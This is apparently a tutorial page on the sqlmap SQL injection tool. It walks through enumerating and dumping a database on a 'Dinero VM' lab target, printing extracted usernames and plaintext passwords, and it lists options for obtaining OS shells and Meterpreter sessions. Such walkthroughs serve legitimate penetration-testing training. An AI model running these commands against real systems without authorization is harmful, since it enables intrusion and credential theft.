.. _sqlmappage:

SQLMap
======
SQLMap_'s goal is to **detect and take advantage of SQL injection vulnerabilities** in web applications.
Once it detects one or more SQL injections on the target host, the user can choose among a variety of actions, such as:

- perform an extensive back-end database management system fingerprint
- retrieve DBMS session user and database
- enumerate users
- enumerate password hashes
- enumerate privileges
- enumerate databases
- dump entire or user's specific DBMS tables/columns
- run their own SQL statement
- read specific files on the file system
- and more...

Usage
-----
To use SQLMap_, the typical command is:

.. code-block:: console

    sqlmap -u [TARGET] [OPTIONS]

.. note:: 

    ``-u`` option denotes the target. see :ref:`-u<uurloption>` for more information.

.. important::

    SQLMap_ typically works by leveraging the ``GET`` parameter at the end of an URL. (e.g. ``?id=1``, ``?category=painting``, etc.)

Example
-------

.. note::

    This example utilizes :ref:`Dinero VM<dinero>`.

Listing Databases
~~~~~~~~~~~~~~~~~

To scan for target databases, we can run the command:

.. code-block:: console

    sqlmap -u http://192.168.233.128:23401/service.php?id=3 --dbs

.. code-block:: console

    > sqlmap -u http://192.168.233.128:23401/service.php?id=3 --dbs

            ___
           __H__
     ___ ___[,]_____ ___ ___  {1.6#stable}
    |_ -| . [,]     | .'| . |
    |___|_  [)]_|_|_|__,|  _|
          |_|V...       |_|   https://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 23:52:05 /2022-07-07/
    [...]
    [...]
    [00:36:05] [INFO] the back-end DBMS is MySQL
    web server operating system: Linux Ubuntu 18.04 (bionic)
    web application technology: Apache 2.4.29
    back-end DBMS: MySQL >= 5.0.12
    [00:36:05] [INFO] fetching database names
    available databases [2]:
    [*] dinero_db
    [*] information_schema

    [00:36:05] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.233.128'
    [00:36:05] [WARNING] your sqlmap version is outdated

    [*] ending @ 00:36:05 /2022-07-08/

We can see that the target contains 2 databases, ``dinero_db`` and ``information_schema``.

Listing Tables
~~~~~~~~~~~~~~

To scan for target database tables, we can run the command:

.. code-block:: console

    sqlmap -u http://192.168.233.128:23401/service.php?id=3 -D dinero_db --tables

.. code-block:: console

    > sqlmap -u http://192.168.233.128:23401/service.php?id=3 -D dinero_db --tables

            ___
           __H__
     ___ ___[,]_____ ___ ___  {1.6#stable}
    |_ -| . [,]     | .'| . |
    |___|_  [)]_|_|_|__,|  _|
          |_|V...       |_|   https://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 23:52:05 /2022-07-07/
    [...]
    [...]
    [00:36:05] [INFO] the back-end DBMS is MySQL
    web server operating system: Linux Ubuntu 18.04 (bionic)
    web application technology: Apache 2.4.29
    back-end DBMS: MySQL >= 5.0.12
    [02:34:44] [INFO] fetching tables for database: 'dinero_db'
    Database: dinero_db
    [5 tables]
    +--------------+
    | client       |
    | contact_list |
    | service      |
    | team_member  |
    | testimonial  |
    +--------------+

We can see that the target database contains 5 tables, ``client``,  ``contact_list``, ``service``, ``team_member``, and ``testimonial``.

Listing Columns
---------------
To scan for target table columns, we can run the command:

.. code-block:: console

    sqlmap -u http://192.168.233.128:23401/service.php?id=3 -D dinero_db -T team_member --columns

.. code-block:: console

    > sqlmap -u http://192.168.233.128:23401/service.php?id=3 -D dinero_db -T team_member --columns

            ___
           __H__
     ___ ___[,]_____ ___ ___  {1.6#stable}
    |_ -| . [,]     | .'| . |
    |___|_  [)]_|_|_|__,|  _|
          |_|V...       |_|   https://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 23:52:05 /2022-07-07/
    [...]
    [...]
    [00:36:05] [INFO] the back-end DBMS is MySQL
    web server operating system: Linux Ubuntu 18.04 (bionic)
    web application technology: Apache 2.4.29
    back-end DBMS: MySQL >= 5.0.12
    [02:43:44] [INFO] fetching columns for table 'team_member' in database 'dinero_db'
    Database: dinero_db
    Table: team_member
    [5 columns]
    +----------+------+
    | Column   | Type |
    +----------+------+
    | position | text |
    | image    | text |
    | name     | text |
    | password | text |
    | username | text |
    +----------+------+

We can see that the target table contains 5 columns, ``position``,  ``image``, ``name``, ``password``, and ``username``.

Dumping Table Contents
~~~~~~~~~~~~~~~~~~~~~~
To dump table contents, we can run the command:

.. code-block:: console

    sqlmap -u http://192.168.233.128:23401/service.php?id=3 -D dinero_db -T team_member --dump

.. code-block:: console

    > sqlmap -u http://192.168.233.128:23401/service.php?id=3 -D dinero_db -T team_member --dump

            ___
           __H__
     ___ ___[,]_____ ___ ___  {1.6#stable}
    |_ -| . [,]     | .'| . |
    |___|_  [)]_|_|_|__,|  _|
          |_|V...       |_|   https://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 23:52:05 /2022-07-07/
    [...]
    [...]
    [00:36:05] [INFO] the back-end DBMS is MySQL
    web server operating system: Linux Ubuntu 18.04 (bionic)
    web application technology: Apache 2.4.29
    back-end DBMS: MySQL >= 5.0.12
    [02:44:25] [INFO] fetching entries for table 'team_member' in database 'dinero_db'
    Database: dinero_db
    Table: team_member
    [4 entries]
    +------------------+----------------------+-------------------------+--------------+------------------------+
    | name             | image                | password                | username     | position               |
    +------------------+----------------------+-------------------------+--------------+------------------------+
    | Juarez White     | Juarez White.jpg     | D!@D3105T0nt05          | juarez       | Chief Executive Offier |
    | Sarah Johnson    | Sarah Johnson.jpg    | S@R@H1Tm@n24u           | sarahj       | Product Manager        |
    | William Anderson | William Anderson.jpg | 12215myf120rit3NuMB@@RR | wanderson122 | CTO                    |
    | Amanda Jepson    | Amanda Jepson.jpg    | J3p50Nap5P@55w0rd       | jepson       | Accountant             |
    +------------------+----------------------+-------------------------+--------------+------------------------+

We can see that the target table contains 4 entries.

.. note::

    We can also ``--dump`` the entire database by omitting ``-T`` Option.

Options
-------
-h / --help
~~~~~~~~~~~
    Show basic help message and exit

.. _hhoption:

-hh
~~~
    Show advanced help message and exit

--version
~~~~~~~~~
    Show program's version number and exit

-v <*VERBOSE*>
~~~~~~~~~~~~~~
    Verbosity level: ``0-6`` (default ``1``)

.. _uurloption:

-u <*URL*> / --url=<*URL*>
~~~~~~~~~~~~~~~~~~~~~~~~~~
    Target ``URL`` (e.g. ``http://www.site.com/vuln.php?id=1``)

-g <*GOOGLEDORK*>
~~~~~~~~~~~~~~~~~
    Process Google dork results as target URLs

--data=<*DATA*>
~~~~~~~~~~~~~~~
    Data string to be sent through ``POST`` (e.g. ``id=1``)

--cookie=<*COOKIE*>
~~~~~~~~~~~~~~~~~~~
    HTTP Cookie header value (e.g. ``PHPSESSID=a8d127e..``)

--random-agent
~~~~~~~~~~~~~~
    Use randomly selected ``HTTP User-Agent`` header value

--proxy=<*PROXY*>
~~~~~~~~~~~~~~~~~
    Use a proxy to connect to the target ``URL``

--tor
~~~~~
    Use Tor anonymity network

--check-tor
~~~~~~~~~~~
    Check to see if Tor is used properly

-p <*TESTPARAMETER*>
~~~~~~~~~~~~~~~~~~~~
    Testable parameter(s)

--dbms=<*DBMS*>
~~~~~~~~~~~~~~~
    Force back-end DBMS to provided value

--level=<*LEVEL*>
~~~~~~~~~~~~~~~~~
    Level of tests to perform (``1-5``, default ``1``)

--risk=<*RISK*>
~~~~~~~~~~~~~~~
    Risk of tests to perform (``1-3``, default ``1``)

--technique=<*TECH*>
~~~~~~~~~~~~~~~~~~~~
    SQL injection techniques to use (default ``BEUSTQ``)

-a / --all
~~~~~~~~~~
    Retrieve everything

-b / --banner
~~~~~~~~~~~~~
    Retrieve DBMS banner

--current-user
~~~~~~~~~~~~~~
    Retrieve DBMS current user

--current-db
~~~~~~~~~~~~
    Retrieve DBMS current database

--passwords
~~~~~~~~~~~
    Enumerate DBMS users password hashes

--tables
~~~~~~~~
    Enumerate DBMS database tables

--columns
~~~~~~~~~
    Enumerate DBMS database table columns

--schema
~~~~~~~~
    Enumerate DBMS schema

--dump
~~~~~~
    Dump DBMS database table entries

--dump-all
~~~~~~~~~~
    Dump all DBMS databases tables entries

-D <*DB*>
~~~~~~~~~
    DBMS database to enumerate

-T <*TBL*>
~~~~~~~~~~
    DBMS database table(s) to enumerate

-C <*COL*>
~~~~~~~~~~
    DBMS database table column(s) to enumerate

--os-shell
~~~~~~~~~~
    Prompt for an interactive operating system shell

--os-pwn
~~~~~~~~
    Prompt for an OOB shell, Meterpreter or VNC

--batch
~~~~~~~
    Never ask for user input, use the default behavior

--flush-session
~~~~~~~~~~~~~~~
    Flush session files for current target

--wizard
~~~~~~~~
    Simple wizard interface for beginner users

.. important::

    To see full list of options run with :ref:`-hh<hhoption>`.

.. _SQLMap: https://www.kali.org/tools/sqlmap/